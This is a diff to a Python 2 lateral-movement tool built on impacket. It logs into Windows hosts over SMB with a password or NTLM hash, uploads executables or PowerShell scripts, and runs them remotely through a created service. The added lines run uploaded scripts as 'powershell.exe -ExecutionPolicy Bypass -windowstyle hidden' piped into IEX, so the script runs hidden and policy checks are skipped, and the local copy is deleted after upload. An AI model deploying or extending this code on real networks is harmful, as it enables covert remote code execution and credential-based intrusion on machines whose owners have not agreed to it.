@@ -7,7 +7,6 @@ from impacket.dcerpc.v5.dtypes import NULL
 from impacket.smbconnection import *
 import argparse
 import time
-import ntpath
 import ConfigParser
 import traceback
 import random
@@ -220,8 +219,6 @@ class CMDEXEC:
         for protocol in self.__protocols:
             protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
             port = protodef[1]
-            #logging.info("Trying protocol %s..." % protocol)
-            #logging.info("Creating service %s..." % self.__serviceName)
 
             stringbinding = protodef[0] % addr
             rpctransport = transport.DCERPCTransportFactory(stringbinding)
@@ -241,15 +238,6 @@ class CMDEXEC:
                     return
                 else:
                     print "[-] {}".format(e)
-
-                #self.__mode = 'SERVER'
-                #serverThread = SMBServer()
-                #serverThread.daemon = True
-                #serverThread.start()
-                #self.shell = RemoteShellsmbexec(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
-                #self.shell.set_copyback()
-                #result = self.shell.send_data(self.__command)
-                #serverThread.stop()
 
             except  (Exception, KeyboardInterrupt), e:
                 print e
@@ -351,7 +339,7 @@ class RemoteShellwmi():
 
 def upload_file(smbconn, host, src, dst):
     dst = string.replace(dst,'/','\\')
-    dst = ntpath.normpath(dst)
+    dst = os.path.normpath(dst)
     dst = dst.split('\\')
     share = dst[0].replace(':', '$')
     dst = '\\'.join(dst[1:])
@@ -372,7 +360,7 @@ def upload_file(smbconn, host, src, dst):
         print '[!] Invalid source. File does not exist'
     return False
 
-def connect(host, port, user, passwd, hash, share, upload_execute, exe_name, src, dst, command, domain="workgroup", execm="smbexec"):
+def connect(host, port, user, passwd, hash, share, file_to_upload, src_folder, dst_folder, command, domain="workgroup", execm="smbexec"):
     try:
         smb = SMBConnection(host, host, None, port, timeout=2)
         try:
@@ -383,9 +371,15 @@ def connect(host, port, user, passwd, hash, share, upload_execute, exe_name, src
 
         print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, port, smb.getServerOS(), smb.getServerName(), domain)
 
-        if upload_execute:
-            command = '"%s"' % dst
+        if file_to_upload:
+            # execute exe file
+            if len(file_to_upload) == 1:
+                command = '"%s"' % file_to_upload[0]
             
+            # execute ps1 file
+            else:
+                command = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden /c "cat %s | Out-String | IEX"' % (dst_folder + file_to_upload[0])
+
         if command:
             try:
                 lmhash = ''
@@ -395,9 +389,11 @@ def connect(host, port, user, passwd, hash, share, upload_execute, exe_name, src
 
                 smb.login(user, passwd, domain, lmhash, nthash)
 
-                if upload_execute:
-                    if upload_file(smb, host, src, dst):
-                        print '[!] Do not forget to remove the file: %s ' % dst
+                if file_to_upload:
+                    for file in file_to_upload:
+                        if upload_file(smb, host, src_folder + file, dst_folder + file):
+                            os.remove(src_folder + file)
+                            print '[!] Do not forget to remove the file: %s' % (dst_folder + file)
                 
                 if command:
                     if execm == 'smbexec':
